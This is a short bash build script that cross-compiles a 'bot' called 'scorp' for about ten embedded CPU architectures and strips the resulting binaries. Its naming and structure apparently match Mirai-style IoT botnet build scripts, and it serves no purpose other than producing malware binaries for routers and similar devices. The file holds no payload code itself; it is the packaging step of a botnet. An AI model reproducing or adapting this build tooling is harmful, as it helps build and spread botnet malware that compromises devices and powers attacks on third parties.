#!/bin/bash

FLAGS="-DIPV4"

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -Dscorp_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
	#yeh so so men uwu?
	mkdir release

    compile_bot i586 scorp.x86 "$FLAGS -static"
    compile_bot mips scorp.mips "$FLAGS -static"
    compile_bot mipsel scorp.mpsl "$FLAGS -static"
    compile_bot armv4l scorp.arm "$FLAGS -static"
    compile_bot armv5l scorp.arm5n "$FLAGS "
    compile_bot armv6l scorp.arm7 "$FLAGS -static"
    compile_bot powerpc scorp.ppc "$FLAGS -static"
    compile_bot sparc scorp.spc "$FLAGS -static"
    compile_bot m68k scorp.m68k "$FLAGS -static"
    compile_bot sh4 scorp.sh4 "$FLAGS -static"
